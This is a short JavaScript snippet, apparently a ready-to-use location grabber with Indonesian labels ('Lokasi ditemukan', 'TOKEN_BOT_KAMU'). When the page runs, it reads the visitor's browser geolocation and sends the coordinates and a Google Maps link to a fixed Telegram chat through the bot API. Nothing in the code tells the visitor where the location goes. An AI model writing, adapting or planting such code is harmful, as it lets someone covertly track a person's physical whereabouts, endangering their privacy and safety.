const token = "TOKEN_BOT_KAMU";
const chat_id = "8334910422";

function kirimLokasi(lat, lon) {

const url = `https://api.telegram.org/bot${token}/sendMessage`;

const text = `
📍 Lokasi ditemukan

Latitude: ${lat}
Longitude: ${lon}

https://www.google.com/maps?q=${lat},${lon}
`;

fetch(url,{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
chat_id:chat_id,
text:text
})
});

}

navigator.geolocation.getCurrentPosition(function(pos){

const lat = pos.coords.latitude;
const lon = pos.coords.longitude;

kirimLokasi(lat,lon);

});
